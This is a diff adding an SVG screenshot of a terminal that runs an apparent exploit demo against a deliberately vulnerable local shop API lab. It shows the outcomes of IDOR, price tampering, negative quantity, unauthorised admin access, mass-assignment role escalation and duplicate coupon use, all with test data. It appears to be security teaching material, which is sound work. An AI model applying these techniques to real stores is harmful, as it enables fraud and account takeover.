@@ -1,0 +1,21 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 890 458" width="890" height="458" role="img" aria-label="shopapi-lab: vulnerable mode">
+<rect width="890" height="458" rx="8" fill="#0d1117"/>
+<rect width="890" height="34" rx="8" fill="#161b22"/><rect y="20" width="890" height="14" fill="#161b22"/>
+<circle cx="20" cy="17" r="5.5" fill="#ff5f56"/><circle cx="40" cy="17" r="5.5" fill="#ffbd2e"/><circle cx="60" cy="17" r="5.5" fill="#27c93f"/>
+<text x="445" y="21" text-anchor="middle" font-family="Consolas,'DejaVu Sans Mono','Liberation Mono','Courier New',monospace" font-size="12" fill="#8b949e">shopapi-lab: vulnerable mode</text>
+<g font-family="Consolas,'DejaVu Sans Mono','Liberation Mono','Courier New',monospace" font-size="13" style="white-space:pre">
+<text x="24" y="62" textLength="351.0" lengthAdjust="spacing" xml:space="preserve"><tspan fill="#7ee787">$ </tspan><tspan fill="#e6edf3">python exploits/demo.py   # vulnerable mode</tspan></text>
+<text x="24" y="81" textLength="366.6" lengthAdjust="spacing" xml:space="preserve"><tspan fill="#c9d1d9">Target: http://127.0.0.1:5000  mode: vulnerable</tspan></text>
+<text x="24" y="119" textLength="304.2" lengthAdjust="spacing" xml:space="preserve"><tspan fill="#79c0ff">[1. IDOR: alice reads bob&#x27;s order 1002]</tspan></text>
+<text x="24" y="138" textLength="842.4" lengthAdjust="spacing" xml:space="preserve"><tspan fill="#c9d1d9">  HTTP 200  {&quot;address&quot;: &quot;Kwiatowa 5, Gdansk&quot;, &quot;coupons&quot;: [], &quot;id&quot;: 1002, &quot;items&quot;: [{&quot;price&quot;: 349.0, &quot;prod...</tspan></text>
+<text x="24" y="176" textLength="304.2" lengthAdjust="spacing" xml:space="preserve"><tspan fill="#79c0ff">[2a. Price tampering: monitor for 0.01]</tspan></text>
+<text x="24" y="195" textLength="842.4" lengthAdjust="spacing" xml:space="preserve"><tspan fill="#c9d1d9">  HTTP 201  {&quot;address&quot;: &quot;&quot;, &quot;coupons&quot;: [], &quot;id&quot;: 1003, &quot;items&quot;: [{&quot;price&quot;: 0.01, &quot;product_id&quot;: 3, &quot;qty&quot;: ...</tspan></text>
+<text x="24" y="233" textLength="241.8" lengthAdjust="spacing" xml:space="preserve"><tspan fill="#79c0ff">[2b. Negative quantity: qty -2]</tspan></text>
+<text x="24" y="252" textLength="842.4" lengthAdjust="spacing" xml:space="preserve"><tspan fill="#c9d1d9">  HTTP 201  {&quot;address&quot;: &quot;&quot;, &quot;coupons&quot;: [], &quot;id&quot;: 1004, &quot;items&quot;: [{&quot;price&quot;: 349.0, &quot;product_id&quot;: 3, &quot;qty&quot;:...</tspan></text>
+<text x="24" y="290" textLength="273.0" lengthAdjust="spacing" xml:space="preserve"><tspan fill="#79c0ff">[3. Admin endpoint as regular user]</tspan></text>
+<text x="24" y="309" textLength="842.4" lengthAdjust="spacing" xml:space="preserve"><tspan fill="#c9d1d9">  HTTP 200  [{&quot;email&quot;: &quot;alice@shop.test&quot;, &quot;id&quot;: 1, &quot;name&quot;: &quot;Alice&quot;, &quot;role&quot;: &quot;user&quot;, &quot;username&quot;: &quot;alice&quot;},...</tspan></text>
+<text x="24" y="347" textLength="265.2" lengthAdjust="spacing" xml:space="preserve"><tspan fill="#79c0ff">[4. Mass assignment: set own role]</tspan></text>
+<text x="24" y="366" textLength="811.2" lengthAdjust="spacing" xml:space="preserve"><tspan fill="#c9d1d9">  HTTP 200  {&quot;email&quot;: &quot;alice@shop.test&quot;, &quot;id&quot;: 1, &quot;name&quot;: &quot;Alice&quot;, &quot;role&quot;: &quot;admin&quot;, &quot;username&quot;: &quot;alice&quot;}</tspan></text>
+<text x="24" y="404" textLength="257.4" lengthAdjust="spacing" xml:space="preserve"><tspan fill="#79c0ff">[5. Coupon applied a second time]</tspan></text>
+<text x="24" y="423" textLength="842.4" lengthAdjust="spacing" xml:space="preserve"><tspan fill="#c9d1d9">  HTTP 200  {&quot;address&quot;: &quot;Dluga 1, Poznan&quot;, &quot;coupons&quot;: [&quot;SAVE10&quot;, &quot;SAVE10&quot;], &quot;id&quot;: 1001, &quot;items&quot;: [{&quot;price...</tspan></text>
+</g></svg>
